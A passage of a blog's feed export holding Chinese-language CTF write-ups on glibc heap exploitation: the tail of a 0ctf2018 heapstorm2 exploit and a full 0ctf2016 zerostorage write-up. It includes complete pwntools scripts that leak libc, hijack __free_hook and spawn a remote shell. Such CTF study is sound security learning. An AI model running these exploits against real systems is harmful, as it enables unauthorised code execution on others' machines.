class="number">0x20</span>)      <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">6</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0x500</span>)     <span class="comment"># 3</span></span><br><span class="line">    allocate(<span class="number">0x500</span>)     <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x80</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0x401</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x20</span>+<span class="number">3</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x13370800</span>+<span class="number">8</span><span class="number">-0x20</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    allocate(<span class="number">0x20</span>)      <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x90</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>))</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x40</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x31</span>) + p64(<span class="number">0x13370800</span><span class="number">-0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0x48</span>)      <span class="comment"># 5</span></span><br><span class="line">    update(<span class="number">5</span>, <span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>) + p64(<span class="number">0x13370830</span>) + p64(<span class="number">0x100</span>))</span><br><span class="line">    </span><br><span class="line">    update(<span class="number">0</span>, <span class="number">0x10</span>, p64(<span class="number">0x133707f3</span>) + p64(<span class="number">0x8</span>))</span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Chunk[1]: &quot;</span>)</span><br><span class="line">    heap_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">0</span>, <span class="number">0x10</span>, p64(heap_base+<span class="number">0x4a0</span>+<span class="number">0x10</span>) + p64(<span class="number">0x8</span>))</span><br><span class="line">    log.debug(<span class="string">&quot;heap: 0x%x&quot;</span> % (heap_base+<span class="number">0x4a0</span>+<span class="number">0x10</span>))</span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Chunk[1]: &quot;</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ABC80</span></span><br><span class="line"></span><br><span class="line">    update(<span class="number">0</span>, <span class="number">0x10</span>, p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]) + p64(<span class="number">0x20</span>))</span><br><span class="line">    update(<span class="number">1</span>, <span class="number">0x8</span>, p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    log.debug(<span class="string">&quot;system: 0x%x&quot;</span> % (libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b *$rebase(0x1331)&quot;)</span></span><br><span class="line">    update(<span class="number">0</span>, <span class="number">8</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ol><li>how2heap large_bin_attack.c</li><li><a href="https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/">https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/</a></li><li><a href="https://eternalsakura13.com/2018/04/03/heapstorm2/">https://eternalsakura13.com/2018/04/03/heapstorm2/</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;large-bin-attack&quot;&gt;&lt;a href=&quot;#large-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;large bin attack&quot;&gt;&lt;/a&gt;large bin attack&lt;/h2&gt;&lt;p&gt;对已存在于large bin中的chunk的bk、bk_nextsize字段进行更改，在unsorted bin中取出插入该large bin时，会将bk-&amp;gt;fd、bk_nextsize-&amp;gt;fd_nextsize的位置覆盖成chunk的地址。涉及的代码就是unsorted bin遍历取出插入那块。和先前的unsorted bin attack类似，通常为进一步攻击做准备，如修改global_max_fast。&lt;/p&gt;
&lt;p&gt;这里比较难理解就是large bin的结构，特别是先前我被一个&lt;a href=&quot;https://raw.githubusercontent.com/clxsh/pics/master/img/largebin.png&quot;&gt;large bin结构图&lt;/a&gt;所误导，下面给出我画的结构图（如果有错误o((⊙﹏⊙))o，请帮忙指出）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/clxsh/pics/master/img/large_bin2.png&quot; alt=&quot;glibc large bin&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;0ctf2018-heapstorm2&quot;&gt;&lt;a href=&quot;#0ctf2018-heapstorm2&quot; class=&quot;headerlink&quot; title=&quot;0ctf2018 heapstorm2&quot;&gt;&lt;/a&gt;0ctf2018 heapstorm2&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;功能分析&quot;&gt;&lt;a href=&quot;#功能分析&quot; class=&quot;headerlink&quot; title=&quot;功能分析&quot;&gt;&lt;/a&gt;功能分析&lt;/h3&gt;&lt;p&gt;程序首先使用mallopt函数将global_max_fast设置为0，也就是不使用fastbin。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="how2heap" scheme="http://hhdx.xyz/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>How2heap--unsorted_bin_attack 0ctf2016--zerostorage</title>
    <link href="http://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/"/>
    <id>http://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/</id>
    <published>2020-07-12T02:01:35.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>对unsorted bin中的<code>chunk-&gt;bk</code>进行修改，接下来该chunk分配出去时，<code>chunk-&gt;bk-&gt;fd</code>就被赋值为unsortedbin头结点地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>在glibc2.28中增加了以下检查，使得此攻击失效。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>unsorted bin attack通常为进一步的攻击做准备，比如覆写global_max_fast。</p><h2 id="0ctf2016-zerostorage"><a href="#0ctf2016-zerostorage" class="headerlink" title="0ctf2016 zerostorage"></a>0ctf2016 zerostorage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>关键数据结构</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712102723178.png" alt="image-20200712102723178"></p><p>flag：标识该节点是否存在</p><p>size：记录大小</p><p>content：数据块指针</p><p>程序有以下功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Insert</span><br><span class="line">2. Update</span><br><span class="line">3. Merge</span><br><span class="line">4. Delete</span><br><span class="line">5. View</span><br><span class="line">6. List</span><br><span class="line">7. Exit</span><br></pre></td></tr></table></figure><p>insert：获取数据块大小，并读入数据。数据块大小在128~4096这个范围内</p><p>update：对数据块进行大小内容进行更新</p><p>merge：将两节点合并。这里存在漏洞，输入两次相同的id，导致UAF。这个漏洞我没发现，思维还不够猥琐啊</p><p>delete：释放数据块，清空节点</p><h3 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h3><p>通过UAF，首先泄露libc基址，然后修改其bk指针，使用unsorted bin attack修改global_max_fast变量；fastbin bin attack覆写<code>__free_hook</code>为system函数地址。</p><a id="more"></a><h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h3><p>merge函数中，from的指针将会被释放，to的指针赋值给新的块。而它没有检查from和to是否是一个数据块的情况，导致<strong>指针被赋值给新数据块，同时也被释放到unsorted bin中</strong>。</p><p>当它被释放到unsorted bin中时，fd、bk被填充，view该指针就获得了unsorted bin地址。</p><p>使用update函数将<code>global_max_fast-0x10</code>地址写入到其bk区域，分配一次后就将global_max_fast赋了一个很大的值，接下来只要不超过这个大小的chunk都会被当做fastbin处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uaf, leak libc base from unsorted bin</span></span><br><span class="line">insert(<span class="number">0x10</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0</span></span><br><span class="line">insert(<span class="number">0x10</span>, <span class="string">b&quot;/bin/sh&quot;</span>)    <span class="comment"># 0, 1</span></span><br><span class="line">insert(<span class="number">0xf8</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2</span></span><br><span class="line">merge(<span class="number">0</span>, <span class="number">0</span>)                 <span class="comment">#    1, 2, 3</span></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ABC60</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line">maxfast_addr = libc_base + libc.sym[<span class="string">&quot;global_max_fast&quot;</span>]</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0xCE8)&quot;</span>)     <span class="comment"># break at switch</span></span><br><span class="line">update(<span class="number">3</span>, <span class="number">0x10</span>, p64(<span class="number">0xdeadbeef</span>) + p64(maxfast_addr<span class="number">-0x10</span>))</span><br><span class="line">insert(<span class="number">0x80</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2, 3</span></span><br></pre></td></tr></table></figure><h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712111119500.png" alt="image-20200712111119500"></p><p>通过以上命令可以看到<code>__free_hook</code>的低地址方向存在一个0x02，可以通过这个数据构造成<code>chunk-&gt;size=0x200</code>，如下所示。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200712111558299.png" alt="image-20200712111558299"></p><p>接下来的工作就是构造一个可以改写chunk-&gt;fd的、0x200的伪fastbin。</p><p>构造关键点：<strong>realloc函数中，在重新分配的大小大于原来且nextchunk是topchunk时，会直接从topchunk中切割所需大小。</strong>这样就避免了分配的出错。</p><p>所以一开始在topchunk分配<code>(0x200-0x10)/2=0xf8</code>，且接下来不再使用topchunk，unsorted bin attack之后，将它merge，就同时获得了修改该0x200chunk的能力，也被free到0x200的fastbin。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line">merge(<span class="number">2</span>, <span class="number">2</span>)                 <span class="comment"># 0, 1,    3, 4</span></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x1f0</span>, p64(libc_base+<span class="number">0x3AD84F</span>))</span><br><span class="line">insert(<span class="number">0x1f0</span>, <span class="string">b&quot;&quot;</span>)          <span class="comment"># 0, 1, 2, 3, 4</span></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0x49</span> + p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">insert(<span class="number">0x1f0</span>, payload)      <span class="comment"># 0, 1, 2, 3, 4, 5</span></span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/0ctf2016%20zerostorage/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># glibc 2.26</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./zerostorage&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span>(<span class="params">length, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of new entry: &quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter your data: &quot;</span>)</span><br><span class="line">    data = data.ljust(length, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">id, length, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id)) </span><br><span class="line">    io.recvuntil(<span class="string">&quot;Length of entry: &quot;</span>)</span><br><span class="line">    io.sendline(str(length))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Enter your data: &quot;</span>)</span><br><span class="line">    data = data.ljust(length, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">id1, id2</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Merge from Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id1))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Merge to Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">id</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>(<span class="params">id</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">5</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry ID: &quot;</span>)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Entry No.&quot;</span> + str(id) + <span class="string">&quot;:\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># uaf, leak libc base from unsorted bin</span></span><br><span class="line">    insert(<span class="number">0x10</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0</span></span><br><span class="line">    insert(<span class="number">0x10</span>, <span class="string">b&quot;/bin/sh&quot;</span>)    <span class="comment"># 0, 1</span></span><br><span class="line">    insert(<span class="number">0xf8</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2</span></span><br><span class="line">    merge(<span class="number">0</span>, <span class="number">0</span>)                 <span class="comment">#    1, 2, 3</span></span><br><span class="line">    view(<span class="number">3</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3ABC60</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin attack</span></span><br><span class="line">    maxfast_addr = libc_base + libc.sym[<span class="string">&quot;global_max_fast&quot;</span>]</span><br><span class="line">    update(<span class="number">3</span>, <span class="number">0x10</span>, p64(<span class="number">0xdeadbeef</span>) + p64(maxfast_addr<span class="number">-0x10</span>))</span><br><span class="line">    insert(<span class="number">0x80</span>, <span class="string">b&quot;&quot;</span>)           <span class="comment"># 0, 1, 2, 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    merge(<span class="number">2</span>, <span class="number">2</span>)                 <span class="comment"># 0, 1,    3, 4</span></span><br><span class="line">    update(<span class="number">4</span>, <span class="number">0x1f0</span>, p64(libc_base+<span class="number">0x3AD84F</span>))</span><br><span class="line">    insert(<span class="number">0x1f0</span>, <span class="string">b&quot;&quot;</span>)          <span class="comment"># 0, 1, 2, 3, 4</span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x49</span> + p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])</span><br><span class="line">    insert(<span class="number">0x1f0</span>, payload)      <span class="comment"># 0, 1, 2, 3, 4, 5</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argc = len(sys.argv)</span><br><span class="line"><span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">    io = process(localfile)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    io = remote(host, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>how2heap unsorted bin attack</li><li><a href="https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html">https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html</a></li><li><a href="http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/">0CTF 2016 - Zerostorage Writeup</a></li><li><a href="https://www.anquanke.com/post/id/178418">https://www.anquanke.com/post/id/178418</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;unsorted-bin-attack&quot;&gt;&lt;a href=&quot;#unsorted-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;unsorted bin attack&quot;&gt;&lt;/a&gt;unsorted bin attack&lt;/h2&gt;&lt;p&gt;对unsorted bin中的&lt;code&gt;chunk-&amp;gt;bk&lt;/code&gt;进行修改，接下来该chunk分配出去时，&lt;code&gt;chunk-&amp;gt;bk-&amp;gt;fd&lt;/code&gt;就被赋值为unsortedbin头结点地址。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bck = victim-&amp;gt;bk;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* remove from unsorted list */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unsorted_chunks (av)-&amp;gt;bk = bck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bck-&amp;gt;fd = unsorted_chunks (av);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在glibc2.28中增加了以下检查，使得此攻击失效。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (__glibc_unlikely (bck-&amp;gt;fd != victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	malloc_printerr (&lt;span class=&quot;string&quot;&gt;&amp;quot;malloc(): corrupted unsorted chunks 3&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;unsorted bin attack通常为进一步的攻击做准备，比如覆写global_max_fast。&lt;/p&gt;
&lt;h2 id=&quot;0ctf2016-zerostorage&quot;&gt;&lt;a href=&quot;#0ctf2016-zerostorage&quot; class=&quot;headerlink&quot; title=&quot;0ctf2016 zerostorage&quot;&gt;&lt;/a&gt;0ctf2016 zerostorage&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Arch:     amd64-64-little&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;关键数据结构&lt;/p&gt;
